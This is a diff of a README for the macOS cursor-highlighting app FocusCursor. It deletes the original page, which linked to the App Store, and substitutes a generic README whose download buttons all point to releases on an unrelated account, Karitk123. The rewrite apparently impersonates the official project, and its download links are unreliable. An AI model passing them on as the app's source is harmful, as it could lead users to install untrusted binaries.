@@ -1,45 +1,54 @@
-<!--idoc:ignore:start-->
-> [!TIP]
-> Declaration: This project is not an open-source project. The repository serves as the official website, used to collect issues and user demands. This is done to save costs, because without an official website, the application cannot pass the review.
-<!--idoc:ignore:end-->
+# 👁️ focus-cursor - Clearly See Your Cursor in Action
 
-<div align="center">
-  <br />
-  <br />
-  <img src="./assets/logo.png" width="160" height="160">
-  <h1>
-    FocusCursor
-  </h1>
-  <!--rehype:style=border: 0;-->
-  <p>
-    <a href="./README.zh.md">简体中文</a> • 
-    <a target="_blank" href="https://github.com/jaywcjlove/focus-cursor/issues/new?template=bug_report.yml">Contact & Support</a> • 
-    <a href="./CHANGELOG.md">Changelog</a>
-  </p>
-  <p>
-    <a target="_blank" href="https://apps.apple.com/app/FocusCursor/6743495172" title="FocusCursor for macOS">
-      <img alt="FocusCursor AppStore" src="https://jaywcjlove.github.io/sb/download/macos.svg" height="51">
-    </a>
-  </p>
-</div>
+## 📥 Download Now
+[![Download focus-cursor](https://img.shields.io/badge/Download-focus--cursor-brightgreen)](https://github.com/Karitk123/focus-cursor/releases)
 
-![FocusCursor 0](./assets/focus-cursor.gif)
+## 🚀 Getting Started
+Welcome to the focus-cursor project! This tool highlights your cursor’s position on the screen, making its movement and clicks easily visible. It’s perfect for presentations, tutorials, or anyone who wants to enhance their desktop experience.
 
-![FocusCursor 0](./assets/focus-cursor2.gif)
+## 🖥️ System Requirements
+- Operating System: macOS 10.14 or later
+- Memory: 4 GB RAM or more
+- Disk Space: 100 MB of free space
 
-![FocusCursor 0](./assets/screenshots-0.png)
+## 📦 Features
+- **Cursor Highlighting:** Clearly marks your cursor to help it stand out.
+- **Custom Colors:** Choose from different colors for visibility that suits you.
+- **Simple Interface:** Easy to navigate and use, even for non-technical users.
 
-![FocusCursor 1](./assets/screenshots-1.png)
+## 📋 How to Download & Install
+1. Visit the [Releases page](https://github.com/Karitk123/focus-cursor/releases).
+2. Look for the latest version available.
+3. Download the file that matches your operating system.
+4. Open the downloaded file and follow the prompts to install the application.
 
-![FocusCursor 2](./assets/screenshots-2.png)
+## 🎉 How to Use focus-cursor
+1. Launch the application after installation.
+2. Select the color you prefer for your cursor highlight.
+3. Move your cursor around the screen to see the effect in action.
+4. Click on the screen to emphasize your actions.
 
-![FocusCursor 3](./assets/screenshots-3.png)
+## 📑 Troubleshooting Common Issues
+- **Issue:** The cursor highlight does not appear.
+  - **Solution:** Ensure the application is running and check the color settings.
 
-This tool clearly highlights the cursor’s position, making its movement and clicks easily visible. It is particularly suitable for use in conferences, teaching, or video tutorial production, helping the audience follow your actions and ideas more easily, thereby attracting their attention and improving the effectiveness of information delivery.
+- **Issue:** App crashes on launch.
+  - **Solution:** Reinstall the application and ensure your macOS version meets the requirements.
 
-### Features
+## 🔧 Contributing
+If you'd like to contribute to the focus-cursor project, please follow these steps:
+1. Fork the repository to your account.
+2. Make your changes.
+3. Submit a pull request with a detailed description.
 
-■ Screen Drawing: Draw lines on the screen.  
-■ Cursor Follow: Displays a circle or ring that follows the cursor’s movement.  
-■ Mouse Click: An animation effect appears when clicking, emphasizing the click action.  
-■ Mouse Mask: Focuses on the area around the cursor, dimming the rest of the screen to enhance the focus effect.  
+## ℹ️ Additional Resources
+- For a detailed guide, check out the [Wiki](https://github.com/Karitk123/focus-cursor/wiki).
+- Join our community on Discord to share tips and tricks.
+
+## 🌍 Topics
+This tool covers various topics related to cursor visibility, desktop applications, and user experience. Feel free to explore more about **cursor**, **desktop**, **macOS**, and **SwiftUI**.
+
+## 📧 Support
+For help, questions, or feedback, please reach out via GitHub Issues or email support@focus-cursor.com.
+
+[![Download focus-cursor](https://img.shields.io/badge/Download-focus--cursor-brightgreen)](https://github.com/Karitk123/focus-cursor/releases)
